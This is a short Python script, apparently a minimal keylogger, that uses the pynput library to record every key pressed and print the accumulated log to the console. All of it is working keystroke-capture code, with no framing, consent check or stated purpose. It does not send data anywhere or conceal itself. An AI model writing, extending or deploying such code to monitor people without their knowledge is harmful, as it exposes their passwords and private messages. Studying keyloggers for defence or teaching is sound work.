from pynput import keyboard

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except:
        log += " " + str(key) + " "
    print(log)


try:
    keyboard_listener = keyboard.Listener(on_press=on_press)
    with keyboard_listener:
        keyboard_listener.join()
except:
    pass
